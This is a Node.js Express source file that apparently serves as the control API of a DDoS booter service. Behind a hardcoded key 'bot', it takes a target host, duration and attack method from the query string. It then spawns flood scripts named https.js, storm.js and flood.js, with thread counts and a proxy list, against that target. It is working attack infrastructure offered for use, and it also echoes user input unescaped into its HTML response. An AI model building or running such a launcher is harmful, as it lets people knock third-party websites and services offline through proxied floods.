const express = require('express');
const app = express();
const port = 8080;

const key = "bot";

app.get('/', (req, res) => {
  try {
    const host = req.query.host;
    const time = req.query.time;
    const method = req.query.method;
    const requests = req.query.requests;

    if (req.query.key !== key) {
      return res.status(401).send('Key not working');
    }

     else if (method === 'https') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['https.js', host, time, '8', '5', 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>Request send sucesfully</h1>
                <p>Host: ${host}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('An error occurred during the execution of the process..');
          res.status(500).send('An error occurred during the execution of the process.');
        }
      });	 
    } else if (method === 'storm') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['storm.js', host, time, '72', '5', 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>Request send sucesfully</h1>
                <p>Host: ${host}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('An error occurred during the execution of the process..');
          res.status(500).send('An error occurred during the execution of the process.');
        }
      });	 
    } else if (method === 'flood') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['flood.js', host, time, '72', '5', 'GET', 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>Request send sucesfully</h1>
                <p>Host: ${host}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
	 } else {
          res.status(500).send('');
         }
      });
    } else {
      console.error('Incorrect method..');
      res.status(400).send('Incorrect method.');
    }
  } catch (error) {
    console.error(error);
    res.status(500).send('There is problem.');

  }
});

app.listen(port, () => {
  console.log(`API working on ${port} port`);
});
